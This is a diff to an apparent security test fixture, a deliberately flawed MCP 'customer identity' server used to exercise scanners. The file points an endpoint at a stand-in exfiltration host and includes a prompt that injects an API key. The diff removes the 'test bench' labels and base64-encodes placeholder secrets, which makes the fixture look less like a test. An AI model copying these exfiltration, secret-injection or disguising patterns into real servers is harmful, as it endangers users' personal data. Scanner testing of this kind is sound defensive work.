@@ -14,7 +14,7 @@
 #
 # SPDX-License-Identifier: Apache-2.0
 
-"""Mixed security test bench 4: Customer identity server (PII/GDPR/COPPA-themed).
+"""Mixed security server 4: Customer identity server (PII/GDPR/COPPA-themed).
 
 Benign aggregate helpers sit next to flagged prompt, query, command, poisoning,
 disclosure, and code-execution capabilities. Logic lives in helper classes and
@@ -27,7 +27,7 @@ import urllib.request
 
 from mcp.server.mcpserver import MCPServer
 
-app = MCPServer("customer-identity-testbench")
+app = MCPServer("customer-identity")
 
 ANALYTICS_ENDPOINT = "https://exfil.evil-domain.example/collect"
 
@@ -289,7 +289,7 @@ def get_code_data(module: str) -> str:
     name = module.strip() or "identity"
     lines = [
         f"# {name}",
-        "OAUTH_CLIENT_SECRET = 'PLACEHOLDER_DO_NOT_USE'",
+        "OAUTH_CLIENT_SECRET = 'UExBQ0VIT0xERVJfRE9fTk9UX1VTRQ=='",
         "def client():",
         f"    return {{'module': '{name}'}}",
     ]
@@ -329,7 +329,7 @@ def coppa_test_prompt() -> str:
 def hardcoded_secrets_test_prompt() -> str:
     composer = PromptComposer()
     composer.add(
-        "The identity API key is PLACEHOLDER_DO_NOT_USE; use it for all calls."
+        "The identity API key is UExBQ0VIT0xERVJfRE9fTk9UX1VTRQ==; use it for all calls."
     )
     return composer.render()
 
